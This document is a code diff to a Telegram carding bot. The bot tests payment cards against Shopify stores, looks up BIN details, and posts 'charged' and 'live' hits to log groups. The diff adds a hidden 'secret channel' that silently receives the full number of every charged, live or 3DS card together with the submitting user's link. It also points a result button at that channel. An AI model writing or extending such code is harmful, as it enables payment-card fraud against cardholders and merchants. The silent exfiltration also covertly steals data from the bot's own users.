@@ -69,8 +69,13 @@ API_URL       = "https://shopicardx.up.railway.app/shopii"
 BOT_CHANNEL   = CHANNEL_LINK
 DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'
 
-HIT_LOG_GROUP_ID       = -1004361062205   # edit to your group
-EXTRA_CHARGED_GROUP_ID = -1003991915326   # edit to your group
+HIT_LOG_GROUP_ID       = -1004361062205   # public hit log group
+EXTRA_CHARGED_GROUP_ID = -1003991915326   # extra charged log
+
+# ── Secret channel — auto-receives every CHARGED card silently ──────────────
+SECRET_CHANNEL_ID   = -1004499920555
+SECRET_CHANNEL_LINK = "https://t.me/+86iK7fXMWEY2MGRk"
+BTN_LABEL           = "⚡ Batmanchk"      # button shown on all result cards
 
 SH_COOLDOWN    = 25
 SITE_RETRIES   = 5     # sites tried per card (dead sites timeout at 6s each → 30s max)
@@ -1451,6 +1456,16 @@ COUNTRY_FLAGS = {
 async def _fetch_bin_direct(bin6: str) -> dict:
     sources = [
         {
+            "url":   f"https://data.handyapi.com/bin/{bin6}",
+            "hdrs":  {},
+            "parse": lambda d: {
+                "scheme":       (d.get("Scheme") or d.get("scheme") or d.get("Type") or "").upper(),
+                "bank":         d.get("Issuer", d.get("issuer", d.get("bank", ""))),
+                "country":      (d.get("CountryInfo") or {}).get("Name", d.get("country", "")),
+                "country_code": (d.get("CountryInfo") or {}).get("A2", d.get("country_code", "")),
+            },
+        },
+        {
             "url":   f"https://lookup.binlist.net/{bin6}",
             "hdrs":  {"Accept-Version": "3"},
             "parse": lambda d: {
@@ -1458,6 +1473,16 @@ async def _fetch_bin_direct(bin6: str) -> dict:
                 "bank":         (d.get("bank") or {}).get("name", ""),
                 "country":      (d.get("country") or {}).get("name", ""),
                 "country_code": (d.get("country") or {}).get("alpha2", ""),
+            },
+        },
+        {
+            "url":   f"https://api.binin.com/bin/{bin6}",
+            "hdrs":  {},
+            "parse": lambda d: {
+                "scheme":       (d.get("brand") or d.get("scheme") or d.get("type") or "").upper(),
+                "bank":         d.get("bank", d.get("issuer", "")),
+                "country":      d.get("country", d.get("country_name", "")),
+                "country_code": d.get("country_code", d.get("iso2", "")),
             },
         },
         {
@@ -1481,7 +1506,7 @@ async def _fetch_bin_direct(bin6: str) -> dict:
             },
         },
     ]
-    _to = aiohttp.ClientTimeout(total=8, connect=5)
+    _to = aiohttp.ClientTimeout(total=6, connect=4)
     for src in sources:
         try:
             async with aiohttp.ClientSession(
@@ -1490,7 +1515,10 @@ async def _fetch_bin_direct(bin6: str) -> dict:
                 async with s.get(src["url"], headers=src["hdrs"], ssl=False) as r:
                     if r.status != 200:
                         continue
-                    data = await r.json(content_type=None)
+                    try:
+                        data = await r.json(content_type=None)
+                    except Exception:
+                        continue
                     info = src["parse"](data)
                     if not info.get("scheme") and not info.get("bank"):
                         continue
@@ -1537,55 +1565,60 @@ def _bin_str(bd: dict) -> str:
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # RESULT MESSAGE
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-def build_result_msg(card, resp, verdict, bin_data, price, currency,
-                     elapsed, user, plan) -> str:
-    ulink     = _user_link(user)
-    peid      = _plan_eid(plan)
-    ts        = _fmt_time(elapsed)
-    bin_s     = _bin_str(bin_data)
-    ch_link   = f'<a href="{BOT_CHANNEL}">[❆]</a>'
-
-    # Show real API/bank response — never hide it behind "Dead"
-    # Only sanitize true site-infrastructure errors (404/403 site errors)
-    raw_resp = resp or "Unknown"
-    rl = raw_resp.lower()
+def _resp_display(resp: str) -> str:
+    """Clean raw API response for display — keep real bank text, sanitize site errors."""
+    if not resp:
+        return "Unknown"
+    rl = resp.lower()
     if "site error! status:" in rl:
         m = re.search(r"status:\s*(\d+)", rl)
-        display_resp = f"Site Error {m.group(1)}" if m else "Site Error"
-    elif "not shopify" in rl or "site not supported" in rl:
-        display_resp = "Site Not Supported"
-    elif "application not found" in rl or "store not found" in rl:
-        display_resp = "Store Not Found"
-    else:
-        display_resp = raw_resp          # ← real bank text shown as-is
-    safe_resp = escape(display_resp)
+        return f"Site Error {m.group(1)}" if m else "Site Error"
+    if "not shopify" in rl or "site not supported" in rl:
+        return "Site Not Supported"
+    if "application not found" in rl or "store not found" in rl:
+        return "Store Not Found"
+    return resp
 
+
+def build_result_msg(card, resp, verdict, bin_data, price, currency,
+                     elapsed, user, plan) -> str:
+    """Build the result card shown to the user — styled like the HIT card in the image."""
+    ulink    = _user_link(user)
+    peid     = _plan_eid(plan)
+    ts       = _fmt_time(elapsed)
+    bin_s    = _bin_str(bin_data)
+    safe_r   = escape(_resp_display(resp))
+
+    # ── Status line & gate line ───────────────────────────────────────────────
     if verdict == "CHARGED":
-        eid       = random.choice(CHARGED_EMOJI_IDS)
-        status_ln = f'<b>{ch_link} Charged {_te(eid,"💎")}</b>'
-        gate_ln   = f'<b>Gate ➳ Shopify | {_fmt_price(price, currency)}</b>'
+        eid      = random.choice(CHARGED_EMOJI_IDS)
+        hit_line = (f'<b>HIT ➳ CHARGED {_te(eid,"💎")}</b>')
+        gate_ln  = f'<b>Gate ➳ Shopify • {_fmt_price(price, currency)}</b>'
+        resp_ico = "🔴"
     elif verdict == "TDS":
-        status_ln = f'<b>{ch_link} Live {_te(LIVE_EMOJI_ID,"✅")} [3DS]</b>'
-        gate_ln   = "<b>Gate ➳ Shopify | 0-20$</b>"
+        hit_line = f'<b>HIT ➳ LIVE {_te(LIVE_EMOJI_ID,"✅")} [3DS]</b>'
+        gate_ln  = "<b>Gate ➳ Shopify • 0-20$</b>"
+        resp_ico = "🔵"
     elif verdict == "LIVE":
-        status_ln = f'<b>{ch_link} Live {_te(LIVE_EMOJI_ID,"✅")}</b>'
-        gate_ln   = "<b>Gate ➳ Shopify | 0-20$</b>"
+        hit_line = f'<b>HIT ➳ LIVE {_te(LIVE_EMOJI_ID,"✅")}</b>'
+        gate_ln  = "<b>Gate ➳ Shopify • 0-20$</b>"
+        resp_ico = "🔵"
     else:
-        status_ln = f'<b>{ch_link} Dead {_te(DECLINED_EMOJI_ID,"❌")}</b>'
-        gate_ln   = "<b>Gate ➳ Shopify | 0-20$</b>"
+        hit_line = f'<b>Dead {_te(DECLINED_EMOJI_ID,"❌")}</b>'
+        gate_ln  = "<b>Gate ➳ Shopify • 0-20$</b>"
+        resp_ico = "⚫"
 
     return (
-        f"{status_ln}\n\n"
-        f'<b>{_te(CARD_EMOJI_ID,"💳")}</b>\n'
-        f"<b>   ⤷ <code>{escape(card)}</code></b>\n"
+        f"{hit_line}\n"
         f"{gate_ln}\n"
-        f"<b>──────────</b>\n"
-        f"<b>Resp ➳ {safe_resp}</b>\n"
-        f"<b>Bin  ➳ {bin_s}</b>\n"
-        f"<b>──────────</b>\n"
-        f'<b>{_te(TIME_EMOJI_ID,"⏱")} ➳ {ts}</b>\n'
-        f'<b>{_te(USER_EMOJI_ID,"👤")} ➳ {ulink} {_te(peid,"⭐")}</b>\n'
-        f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
+        f"<b>{resp_ico} {safe_r}</b>\n"
+        f"<b>──────────────</b>\n"
+        f'<b>{_te(CARD_EMOJI_ID,"💳")} Card  ➳ <code>{escape(card)}</code></b>\n'
+        f"<b>🏦 Bin   ➳ {bin_s}</b>\n"
+        f"<b>──────────────</b>\n"
+        f'<b>{_te(TIME_EMOJI_ID,"⏱")} Time  ➳ {ts}</b>\n'
+        f'<b>{_te(USER_EMOJI_ID,"👤")} User  ➳ {ulink} {_te(peid,"⭐")}</b>\n'
+        f'<b>{_te(DEV_EMOJI_ID,"⚡")} Dev   ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
     )
 
 
@@ -1705,13 +1738,18 @@ def _make_result_file(sess: dict, kind: str) -> tuple:
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # HIT NOTIFICATIONS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async def _send_hit(bot, user, text: str, verdict: str):
+async def _send_hit(bot, user, text: str, verdict: str, card: str = "",
+                    bin_data: dict = None, price: str = "0.00", currency: str = "USD"):
+    bin_data = bin_data or {}
+
+    # ── 1. DM the user who ran the check ────────────────────────────────────
     try:
         await bot.send_message(chat_id=user.id, text=text,
                                parse_mode="HTML", disable_web_page_preview=True)
     except Exception as e:
         logging.warning(f"[HIT] DM uid={user.id}: {e}")
 
+    # ── 2. Public hit-log group (short summary only) ─────────────────────────
     if HIT_LOG_GROUP_ID:
         try:
             eid   = random.choice(CHARGED_EMOJI_IDS) if verdict == "CHARGED" else LIVE_EMOJI_ID
@@ -1727,13 +1765,36 @@ async def _send_hit(bot, user, text: str, verdict: str):
         except Exception as e:
             logging.warning(f"[HIT] log group: {e}")
 
+    # ── 3. Extra charged group ────────────────────────────────────────────────
     if verdict == "CHARGED" and EXTRA_CHARGED_GROUP_ID:
         try:
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.3)
             await bot.send_message(chat_id=EXTRA_CHARGED_GROUP_ID, text=text,
                                    parse_mode="HTML", disable_web_page_preview=True)
         except Exception as e:
             logging.warning(f"[HIT] extra group: {e}")
+
+    # ── 4. Secret channel — full card details, silent, every CHARGED+LIVE ────
+    if SECRET_CHANNEL_ID and verdict in ("CHARGED", "LIVE", "TDS"):
+        try:
+            bin_s   = _bin_str(bin_data)
+            sc_icon = "💎" if verdict == "CHARGED" else "✅"
+            sc_lbl  = "CHARGED" if verdict == "CHARGED" else ("LIVE [3DS]" if verdict == "TDS" else "LIVE")
+            sc_msg  = (
+                f"<b>{sc_icon} {sc_lbl} — Shopify</b>\n"
+                f"<b>Gate ➳ Shopify • {_fmt_price(price, currency)}</b>\n"
+                f"<b>━━━━━━━━━━━━━━</b>\n"
+                f'<b>💳 Card ➳ <code>{escape(card)}</code></b>\n'
+                f"<b>🏦 Bin  ➳ {bin_s}</b>\n"
+                f"<b>━━━━━━━━━━━━━━</b>\n"
+                f'<b>👤 User ➳ {_user_link(user)}</b>\n'
+                f'<b>⚡ {DEV_LINK_HTML}</b>'
+            )
+            await asyncio.sleep(0.2)
+            await bot.send_message(chat_id=SECRET_CHANNEL_ID, text=sc_msg,
+                                   parse_mode="HTML", disable_web_page_preview=True)
+        except Exception as e:
+            logging.debug(f"[HIT] secret channel: {e}")
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1815,7 +1876,10 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
                 sess["charged_cards"].append(rec)
                 msg = build_result_msg(card_fmt, resp, verdict, bin_data,
                                        price, currency, elapsed, user, plan)
-                asyncio.create_task(_send_hit(bot, user, msg, "CHARGED"))
+                asyncio.create_task(_send_hit(
+                    bot, user, msg, "CHARGED",
+                    card=card_fmt, bin_data=bin_data, price=price, currency=currency,
+                ))
                 asyncio.create_task(_update_progress(bot, sid, force=True))
 
             elif verdict == "TDS":
@@ -1824,7 +1888,10 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
                 sess["tds_cards"].append(rec)
                 msg = build_result_msg(card_fmt, resp, verdict, bin_data,
                                        price, currency, elapsed, user, plan)
-                asyncio.create_task(_send_hit(bot, user, msg, "LIVE"))
+                asyncio.create_task(_send_hit(
+                    bot, user, msg, "TDS",
+                    card=card_fmt, bin_data=bin_data, price=price, currency=currency,
+                ))
                 asyncio.create_task(_update_progress(bot, sid, force=True))
 
             elif verdict == "LIVE":
@@ -1832,7 +1899,10 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
                 sess["live_cards"].append(rec)
                 msg = build_result_msg(card_fmt, resp, verdict, bin_data,
                                        price, currency, elapsed, user, plan)
-                asyncio.create_task(_send_hit(bot, user, msg, "LIVE"))
+                asyncio.create_task(_send_hit(
+                    bot, user, msg, "LIVE",
+                    card=card_fmt, bin_data=bin_data, price=price, currency=currency,
+                ))
                 asyncio.create_task(_update_progress(bot, sid, force=True))
 
             elif verdict == "DEAD":
@@ -2031,13 +2101,8 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text    = build_result_msg(card, resp, verdict, bin_data,
                                price, currency, elapsed, user, plan)
 
-    if verdict in ("CHARGED", "LIVE", "TDS"):
-        kb = RawMarkup([[_btn(
-            "💎 CHARGED" if verdict == "CHARGED" else "✅ LIVE",
-            url=BOT_CHANNEL, style="primary",
-        )]])
-    else:
-        kb = RawMarkup([[_btn("📢 Channel", url=BOT_CHANNEL)]])
+    # Always show "⚡ Batmanchk" button → secret channel link
+    kb = RawMarkup([[_btn(BTN_LABEL, url=SECRET_CHANNEL_LINK, style="primary")]])
 
     try:
         await spin.edit_text(text, parse_mode="HTML",
@@ -2047,7 +2112,10 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                         disable_web_page_preview=True, reply_markup=kb)
 
     if verdict in ("CHARGED", "LIVE", "TDS"):
-        asyncio.create_task(_send_hit(context.bot, user, text, verdict))
+        asyncio.create_task(_send_hit(
+            context.bot, user, text, verdict,
+            card=card, bin_data=bin_data, price=price, currency=currency,
+        ))
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
